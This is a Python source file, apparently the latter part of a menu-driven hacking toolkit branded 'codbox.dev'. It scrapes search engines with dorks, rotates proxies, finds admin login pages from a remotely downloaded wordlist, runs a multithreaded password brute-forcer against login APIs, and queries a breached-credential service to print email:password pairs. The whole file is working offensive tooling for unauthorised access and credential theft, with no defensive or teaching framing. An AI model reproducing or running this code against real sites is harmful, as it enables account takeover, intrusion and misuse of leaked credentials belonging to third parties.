    print(f" [{Fore.MAGENTA}-{Fore.WHITE}] Pages Loaded: [{Fore.MAGENTA}{str(len(pages))}{Fore.WHITE}]\n [{Fore.MAGENTA}-{Fore.WHITE}] Threads: [{Fore.MAGENTA}{str(threading.active_count())}{Fore.WHITE}]\n [{Fore.MAGENTA}+{Fore.WHITE}] CPM: [{Fore.MAGENTA}{str(values['cpm2']*60)}{Fore.WHITE}]\n\n [{Fore.MAGENTA}+{Fore.WHITE}] Checked: [{Fore.BLUE}{str(values['checked'])}{Fore.WHITE}/{Fore.BLUE}{str(len(pages))}{Fore.WHITE}]\n [{Fore.MAGENTA}+{Fore.WHITE}] Login Pages: [{Fore.GREEN}{str(values['links'])}{Fore.WHITE}]\n [{Fore.MAGENTA}-{Fore.WHITE}] Simple Pages: [{Fore.RED}{str(values['bad'])}{Fore.WHITE}]\n\n [{Fore.MAGENTA}?{Fore.WHITE}] Retries: [{Fore.MAGENTA}{str(values['retries'])}{Fore.WHITE}]\n [{Fore.MAGENTA}?{Fore.WHITE}] Errors: [{Fore.MAGENTA}{str(values['errors'])}{Fore.WHITE}]")
    time.sleep(1)
    threading.Thread(target=admin_screen, args=(pages,)).start()

def admin_finder(url):
    global proxies
    sess = requests.Session()
    if type(proxies) is not list or len(proxies) == 0:
        proxies = None
    else:
        proxy = random.choice(proxies)
        if len(proxy.split(':')) == 2:
            proxies = {'http': 'http://{}'.format(proxy), 'https': 'https://{}'.format(proxy)}
        else:
            splits = proxy.split(':')
            proxies = {'http': 'socks5://{}:{}@{}:{}'.format(splits[2], splits[3], splits[0], splits[1]), 'https': 'socks5://{}:{}@{}:{}'.format(splits[2], splits[3], splits[0], splits[1])}
    sess.proxies = proxies
    try:
        r = sess.get(url)
        page = False
        admin_words = ['login', 'admin', 'administrator', 'user', 'username', 'email']
        for each in admin_words:
            if each in r.text:
                open('results/{}/page.txt'.format(str(now)), 'a+', encoding='utf-8').write(url + '\n')
                values['checked']+=1; values['links']+=1; values['cpm1']+=1
                page = True
                break
        if not page:
            open('results/{}/not-found.txt'.format(str(now)), 'a+', encoding='utf-8').write(url + '\n')
            values['bad']+=1; values['checked']+=1; values['cpm1']+=1
    except:
        values['errors']+=1
        threading.Thread(target=admin_finder, args=(url,)).start()

def editor(username=None):
    CallClear()
    if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
    else: print(title)
    print(' Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
    print(' [1] Duplicate Remover       [2] Links Extractor')
    print(' [3] Regex Extractor         [4] Page Extractor')
    print(' [5] Domain Extractor        [6] Menu')
    print(' [7] Quit')
    try: choose = int(input(' > '))
    except: menu() if username is None else menu(username)
    if choose == 6:
        menu() if username is None else menu(username)
    elif choose == 7:
        sys.exit()
    elif choose not in [1,2,3,4,5,6,7]:
        menu() if username is None else menu(username)
    else:
        fileNameCombo = filedialog.askopenfile(parent=root, mode='rb', title='Choose a file',
                                        filetype=(("txt", "*.txt"), ("All files", "*.txt")))
        if not fileNameCombo:
            menu() if username is None else menu(username)
        loaded = load(fileNameCombo.name)
        if choose == 1:
            lines = set(loaded)
            for each in lines:
                open('results/{}/nodupes.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
            print(' Removed all dupes.')
            input(' Press ENTER to continue.')
            menu() if username is None else menu(username)
        elif choose == 2:
            links = []
            for each in loaded:
                if 'http' in each and '://' in each and '.' in each:
                    links.append(each)
            for each in links:
                open('results/{}/links.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
            print(' Extracted all links..')
            input(' Press ENTER to continue.')
            menu() if username is None else menu(username)
        elif choose == 3:
            pass
        elif choose == 4:
            links = []
            for each in loaded:
                if 'http' in each and '://' in each and '.' in each:
                    try:
                        page = each.split('/')
                        pagesave = ""
                        for each in page[2:len(page)]:
                            pagesave+='/'+each
                        links.append(pagesave)
                    except:
                        pass
            for each in links:
                open('results/{}/pages.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
            print(' Extracted all pages..')
            input(' Press ENTER to continue.')
            menu() if username is None else menu(username)
        elif choose == 5:
            links = []
            for each in loaded:
                if 'http' in each and '://' in each and '.' in each:
                    try:
                        line = each.split('://')[1].split('/')[0]
                        links.append(line)
                    except:
                        pass
            for each in links:
                open('results/{}/domains.txt'.format(str(now)), 'a+', encoding='utf-8').write(each + '\n')
            print(' Extracted all domains..')
            input(' Press ENTER to continue.')
            menu() if username is None else menu(username)
def menu(user=None):
    CallClear()
    if user is None: user = 'user'; istrue = True
    else: istrue = False
    if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
    else: print(title)
    print(' Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
    print(' Welcome, {}, tell me where do you want to go.'.format(Fore.LIGHTRED_EX + user + Fore.WHITE if color is None else Fore.WHITE + user + Fore.WHITE if color == 'default' else colors[settings['theme']] + user + Fore.WHITE))
    print('\n [1] Loading [proxy/dorks]\n [2] Settings [settings/config]\n [3] Start \n [4] Quit')
    try: choose = int(input(' > '))
    except: menu() if istrue is True else menu(user)
    if choose not in [1,2,3,4] : menu() if istrue is True else menu(user)
    if choose == 1:
        CallClear()
        if settings['theme'] == 'default' or len(colors):
            print(colors[settings['theme']] + str(title) + colors['white'])
        else:
            print(title)
        print('\n Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
        print('\n Welcome, {}, tell me where do you want to go.'.format(Fore.LIGHTRED_EX + user + Fore.WHITE if color is None else Fore.WHITE + user + Fore.WHITE if color == 'default' else colors[settings['theme']] + user + Fore.WHITE))
        print('\n [1] Dorks\n [2] Proxies\n [3] Menu \n [4] Quit')
        try: choose = int(input(' > '))
        except: menu() if istrue is True else menu(user)
        if choose not in [1,2,3,4] : menu() if istrue is True else menu(user)
        if choose == 1: 
            dorks_loaded = load('dorks.txt')
            for dork in dorks_loaded: dorks.append(dork)
            print(' Loaded {} dorks.'.format(str(len(dorks))))
            time.sleep(1)
            menu() if istrue is True else menu(user)
        elif choose == 2: 
            proxies_loaded = load('proxies.txt')
            for proxy in proxies_loaded: proxies.append(proxy)
            print(' Loaded {} proxies.'.format(str(len(proxies))))
            time.sleep(1)
            menu() if istrue is True else menu(user)
        elif choose == 3: menu() if istrue is True else menu(user)
        else: sys.exit()
    elif choose == 2:
        CallClear()
        if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
        else: print(title)
        print('\n Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
        print('\n Welcome, {}, tell me where do you want to go.'.format(Fore.LIGHTRED_EX + user + Fore.WHITE if color is None else Fore.WHITE + user + Fore.WHITE if color == 'default' else colors[settings['theme']] + user + Fore.WHITE))
        print('\n [1] Settings\n [2] Config\n [3] Menu \n [4] Quit')
        try: choose = int(input(' > '))
        except: menu() if istrue is True else menu(user)
        if choose not in [1,2,3,4] : menu() if istrue is True else menu(user)
        if choose == 1: 
            CallClear()
            if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
            else: print(title)
            print('\n Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
            print('\n Welcome, {}, what do you want to change?.\n settings.json'.format(Fore.LIGHTRED_EX + user + Fore.WHITE if color is None else Fore.WHITE + user + Fore.WHITE if color == 'default' else colors[settings['theme']] + user + Fore.WHITE))
            print('\n [!] Menu\n [q] Quit\n [t] Timeout \n [c] Config path\n [h] Theme')
            try: choose = input(' > ')
            except: menu() if istrue is True else menu(user)
            if choose == '!':
                menu() if istrue is True else menu(user)
            elif choose == 'q':
                sys.exit()
            elif choose == 't':
                print(' How many timeout do you want to load? [must be a number]')
                try: new_timeout = int(input(' > '))
                except: menu() if istrue is True else menu(user)
                settings['timeout'] = new_timeout
                try:
                    json.dump(settings, open('settings/settings.json', 'w'))
                except:
                    print(' Cannot dump the new value.')
                    time.sleep(1)
                    menu() if istrue is True else menu(user)
                print(' New value dumped.')
                time.sleep(1)
                menu() if istrue is True else menu(user)
            elif choose == 'c':
                print(' New config path is?')
                new_path = input(' > ')
                if not os.path.exists(new_path):
                    print(" The path does not exist.")
                    time.sleep(1)
                    menu() if istrue is True else menu(user)
                else:
                    try:
                        settings['config-path'] = new_path
                        json.dump(settings, open('settings/settings.json', 'w'))
                    except:
                        print(' Cannot dump the new value.')
                        time.sleep(1)
                        menu() if istrue is True else menu(user)
            elif choose == 'h':
                print(" Avaible themes: ")
                print("\n default\n white\n black\n red\n blue\n yellow\n magenta")
                new_theme = input('\n > ')
                if new_theme not in ["default", "white", "black", "red", "blue", "yellow", "magenta"]:
                    print(' The theme does not exist.')
                    time.sleep(1)
                    menu() if istrue is True else menu(user)
                else:
                    settings['theme'] = new_theme
                    try:
                        json.dump(settings, open('settings/settings.json', 'w'))
                    except:
                        print(' Cannot dump the value.')
                        time.sleep(1)
                        menu() if istrue is True else menu(user)
                    print(' New value dumped.')
                    time.sleep(1)
                    menu() if istrue is True else menu(user)
        elif choose == 2: 
            CallClear()
            if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
            else: print(title)
            print('\n Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
            print('\n Welcome, {}, what do you want to change?.\n config.json'.format(Fore.LIGHTRED_EX + user + Fore.WHITE if color is None else Fore.WHITE + user + Fore.WHITE if color == 'default' else colors[settings['theme']] + user + Fore.WHITE))
            print('\n [!] Menu\n [q] Quit\n [i] Discord ID \n [w] Discord Webhook\n [h] Theme')
            try: choose = input(' > ')
            except: menu() if istrue is True else menu(user)
            if choose == '!':
                menu() if istrue is True else menu(user)
            elif choose == 'q':
                sys.exit()
            elif choose == 'i':
                print(' What is your discord id?')
                discord_id = input(' > ')
                try:
                    config['discord-id'] = discord_id
                    json.dump(config, open('settings/config.json', 'w'))
                except:
                    print(' Cannot dump the new value.')
                    time.sleep(1)
                    menu() if istrue is True else menu(user)
                print(' Value dumped.')
                time.sleep(1)
                menu() if istrue is True else menu(user)
            elif choose == 'w':
                print(' What is your discord webhook?')
                webhook = input(' > ')
                try:
                    config['discord-webhook'] = webhook
                    json.dump(config, open('settings/config.json', 'w'))
                except:
                    print(' Cannot dump the new value.')
                    time.sleep(1)
                    menu() if istrue is True else menu(user)
                print(' Value dumped.')
                time.sleep(1)
                menu() if istrue is True else menu(user)
            else:
                menu() if istrue is True else menu(user)
        elif choose == 3: menu() if istrue is True else menu(user)
        else: sys.exit()
    elif choose == 3:
        CallClear()
        if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
        else: print(title)
        print('\n Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
        print(' [1]  Parsing         [2]  Lookup')
        print(' [3]  Exploiter       [4]  Vulnerability')
        print(' [5]  ADMIN           [6]  Editor')
        print(' [7]  ExtremeSX       [8]  BruteForcer')
        print(' [9]  Others          [10] Menu')
        print(' [11] Quit')
        try: choose = int(input(' > '))
        except: menu() if istrue is True else menu(user)
        if choose == 1:
            if len(dorks) == 0:
                print(' Please load your dorks first.')
                time.sleep(1)
                menu() if istrue is True else menu(user)
            CallClear()
            if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
            else: print(title)
            print('\n Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
            print('\n Welcome, {}, tell me where do you want to go.'.format(Fore.LIGHTRED_EX + user + Fore.WHITE if color is None else Fore.WHITE + user + Fore.WHITE if color == 'default' else colors[settings['theme']] + user + Fore.WHITE))
            print(' [1]  MyWebSearch         [2]  Google')
            print(' [3]  Bing                [4]  Yandex')
            print(' [5]  Ask                 [6]  Startpage')
            print(' [7]  Baidu               [8]  DogPile')
            print(' [9]  Yippy               [10] Exalead')
            print(' [11] Webopedia           [12] Google Scholar')
            print(' [13] Ecosia              [14] Yooz')
            print(' [15] W3Catalog           [16] SearX')
            print(' [17] Mail.ru             [18] Rambler')
            print(' [19] Rambler             [20] Persijoo')
            print(' [{}] Menu                [{}] Quit'.format(str(len(websearch_engines)+1), str(len(websearch_engines)+2)))
            try: choose = int(input(' > '))-1
            except: menu() if istrue is True else menu(user)
            if choose == len(websearch_engines):
                menu() if istrue is True else menu(user)
            elif choose == len(websearch_engines)+1:
                sys.exit()
            else:
                if choose > len(websearch_engines)+2:
                    menu() if istrue is True else menu(user)
                print(' What is the max number of threads you want to run in?')
                try: threads = int(input(' > '))
                except: menu() if istrue is True else menu(user)
                current_check = 0
                screen()
                while True:
                    if threading.active_count() <= threads:
                        if current_check < len(dorks):
                            module = websearch_engines[choose]
                            threading.Thread(target=check, args=(dorks[current_check], module,)).start(); current_check+=1
        else:
            if choose == 2:
                CallClear()
                if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
                else: print(title)
                print('\n Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
                print(' What is the domain you want to search?')
                domain_name = input(' > ')
                if 'http' in domain_name:
                    try:
                        domain_name = domain_name.split('//')[1]
                    except:
                        domain_name=domain_name
                domain_info = whois.whois(domain_name)
                print(Fore.LIGHTWHITE_EX + str(domain_info) + Fore.WHITE)
                input('\n Press ENTER to return to menu.')
                menu() if istrue is True else menu(user)
            elif choose == 3:
                CallClear()
                if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
                else: print(title)
                print('\n Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
                print(' What is the data you want to check? [username, email, ip]')
                search_data = input(' > ')   
                try:
                    r = requests.get('http://api.snusbase.com/combo/antipublic/{}'.format(search_data))
                    if '"found":"true",' in r.text:
                        print('\n Finding information.\n')
                        for each in r.json()['results']:
                            try:
                                print(' '+str(each['email']) + ':' + str(each['password']))
                            except: 
                                pass
                    else:
                        print(' Cannot find anything.')
                except:
                    print(' Cannot access ParserX database at this moment, try later.')
                input(' Press ENTER to return to menu.')
            elif choose == 4:
                CallClear()
                if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
                else: print(title)
                print('\n Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
                print(' What is the max number of threads you want to run in?')
                try: threads = int(input(' > '))
                except: menu() if istrue is True else menu(user)
                current_check = 0
                vuln_screen()
                while True:
                    if threading.active_count() <= threads:
                        if current_check < len(dorks):
                            threading.Thread(target=vulnerability, args=(dorks[current_check],)).start(); current_check+=1
            elif choose == 5:
                CallClear()
                if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
                else: print(title)
                print('\n Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
                print(' What is the domain you want to check? (e.g example.com)')
                domain = input(" > ")
                try:
                    print(' Loading wordlist..')
                    r = requests.get('https://parser.codbox.dev/download/wordlist-login.txt')
                except:
                    print(' Our panels are down. Please message any admin!')
                    input(' Press ENTER to continue.')
                    menu() if istrue is True else menu(user)
                pages = r.text.split('\n')
                print(' Loaded {} words.'.format(str(len(pages))))
                print(' What is the max number of threads you want to run in?')
                try: threads = int(input(' > '))
                except: menu() if istrue is True else menu(user)
                current_check = 0
                admin_screen(pages)
                while True:
                    if threading.active_count() <= threads:
                        if current_check < len(pages):
                            current_is = 'http://' + domain + '/' + pages[current_check]
                            threading.Thread(target=admin_finder, args=(current_is,)).start(); current_check+=1
            elif choose == 6:
                editor() if istrue is True else editor(user)
            elif choose == 7:
                print(" THIS OPTION IS NOT RELEASED YET."); time.sleep(2); menu() if istrue is True else menu(user)
            elif choose == 8:
                CallClear()
                if settings['theme'] == 'default' or len(colors): print(colors[settings['theme']] + str(title) + colors['white'])
                else: print(title)
                print('\n Powered by {}codbox.dev{}.\n'.format(Fore.LIGHTRED_EX if color is None else Fore.WHITE if color == 'default' else colors[settings['theme']], Fore.WHITE))
                print(' What is the api? (e.g https://test.com/api)')
                domain = input(" > ")
                if not 'http' in domain:
                    domain = 'http://' + domain
                print(' What is the post data? (e.g username=<USER>&password=<PASS>)')
                payload = input(" > ")
                print(' What is the username you want to use?')
                username = input(' > ')
                payload = payload.replace('<USER>', username)
                print(' What is the good response?')
                good_respone = input(' > ')
                print(' What is the bad response')
                bad_response = input(' > ')
                fileNameCombo = filedialog.askopenfile(parent=root, mode='rb', title='Choose a file',
                                                filetype=(("txt", "*.txt"), ("All files", "*.txt")))
                if not fileNameCombo:
                    menu() if istrue is True else menu(user)
                loaded = load(fileNameCombo.name)
                print(' Loaded {} password'.format(str(len(loaded))))
                input(' All setup, press ENTER to start.')
                print(' What is the max number of threads you want to run in?')
                try: threads = int(input(' > '))
                except: menu() if istrue is True else menu(user)
                current_check = 0
                bruteforcer_screen(loaded)
                while True:
                    if threading.active_count() <= threads:
                        if current_check < len(loaded):
                            threading.Thread(target=bruteforcer, args=(domain, payload, loaded[current_check], good_respone, bad_response,)).start(); current_check+=1
            elif choose == 9:
                print(" THIS OPTION IS NOT RELEASED YET."); time.sleep(2); menu() if istrue is True else menu(user)
            elif choose == 10:
                menu() if istrue is True else menu(user)
            elif choose == 11:
                sys.exit()
            else:
                menu() if istrue is True else menu(user)

    elif choose == 4:
        sys.exit()

menu('extremedev')

